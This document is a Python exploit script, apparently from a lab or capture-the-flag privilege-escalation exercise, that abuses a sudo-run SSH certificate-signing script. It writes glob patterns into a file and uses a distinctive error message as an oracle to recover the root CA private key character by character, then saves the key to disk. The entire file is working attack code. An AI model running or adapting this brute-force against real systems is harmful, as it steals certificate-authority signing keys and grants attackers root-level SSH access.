import subprocess
import string
import os,sys,re

##
##

CA_PATH = '/tmp/ca-test'
SIGNING_SCRIPT = '/opt/things__.sh'
PUB_KEY = 'root.pub'
USER = 'root'
PRINCIPAL = 'root_user'
SERIAL = 'ABCD'
BATCH_SIZE = 4  # Number of characters to test in each batch

##
##

def run_signing_command(pattern):
    with open(CA_PATH, 'wb') as f:
        f.write(pattern.encode('utf-8'))

    try:
        result = subprocess.run(
            ['bash', '-c', f"echo -n '{pattern}' > {CA_PATH}; sudo {SIGNING_SCRIPT} {CA_PATH} {PUB_KEY} {USER} {PRINCIPAL} {SERIAL}"],
            capture_output=True,
            text=True
        )
        return result.stdout.strip(), result.stderr.strip()
    except Exception as e:
        return "", str(e)

def brute_force_patterns(base_pattern=''):
    chars = string.ascii_letters + string.digits + '-+=/ \r\n'
    found_pattern = base_pattern

    while True:
        found = False
        for i in range(0, len(chars), BATCH_SIZE):
            batch = chars[i:i+BATCH_SIZE]
            for char in batch:
                pattern = found_pattern + char + '*'
                stdout, stderr = run_signing_command(pattern)

                if "Error: Use API for signing with this CA." in stdout:
                    found_pattern += char
                    found = True
                    print(f"{found_pattern}")
                    break
            if found:
                break

        if not found:
            break

    return found_pattern

if __name__ == '__main__':
    ca_key = brute_force_patterns()
    if "-----END OPENSSH PRIVATE KEY-----" in ca_key:
        print("\n\nSuccess\n")
        with open("ca-it", "w") as file:
            file.write(ca_key)
    else:
        exit("\n\nFail\n")

##
##
